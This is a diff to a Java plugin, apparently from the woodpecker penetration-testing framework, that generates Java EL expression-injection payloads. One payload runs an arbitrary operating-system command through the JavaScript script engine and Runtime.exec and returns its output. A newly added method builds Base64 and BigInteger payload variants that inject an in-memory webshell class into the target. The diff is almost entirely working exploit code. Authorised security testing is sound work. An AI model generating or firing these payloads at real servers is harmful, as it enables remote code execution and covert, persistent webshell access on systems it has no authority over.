@@ -1,6 +1,8 @@
 package me.gv7.woodpecker.plugin.exprs;
 
 import me.gv7.woodpecker.plugin.IExpr;
+import me.gv7.woodpecker.plugin.utils.MemShellClassFactory;
+import me.gv7.woodpecker.plugin.utils.MemShellJSUtils;
 
 import static me.gv7.woodpecker.plugin.utils.Utils.escape;
 
@@ -43,7 +45,21 @@ public class ELExpr implements IExpr {
     @Override
     public String[] genExecWithEcho(String command) {
         return new String[]{
-                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName('JavaScript').eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"" + escape(command, "\"") + "\").getInputStream()).useDelimiter(\"/\").next();')"
+                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName('js').eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"" + escape(command, "\"") + "\").getInputStream()).useDelimiter(\"/\").next();')"
         };
+    }
+
+    @Override
+    public String[] genMemShell(byte[] memShellClass) {
+        try {
+            return new String[]{
+                    "[+] JS-BASE64方案：==>" + System.lineSeparator() + "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName('js').eval('" + escape(MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64)) + "')" + System.lineSeparator() + " <==",
+                    "[+] JS-BigInteger方案：==>" + System.lineSeparator() + "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName('js').eval('" + escape(MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BIGINTEGER)) + "')" + System.lineSeparator() + " <=="
+            };
+        } catch (Exception ex) {
+            return new String[]{
+                    "class文件异常"
+            };
+        }
     }
 }
